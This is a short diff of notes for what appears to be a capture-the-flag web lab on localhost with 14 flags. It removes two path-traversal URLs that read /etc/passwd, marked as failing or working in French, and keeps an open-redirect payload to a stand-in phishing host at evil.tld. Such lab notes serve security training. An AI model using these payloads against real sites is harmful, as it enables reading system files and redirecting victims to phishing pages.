@@ -12,10 +12,6 @@ There are 14 flags to find:
 
 ## TODELETE AXEL RANDOM
 
-`http://localhost:8080/?page=../../../../etc/passwd` (non)
-
-`http://localhost:8080/?page=../../../../../../../etc/passwd` (oui)
-
 TODO: enumeration on ?page=
 
 `index.php?page=redirect&site=http://evil.tld/phishing`
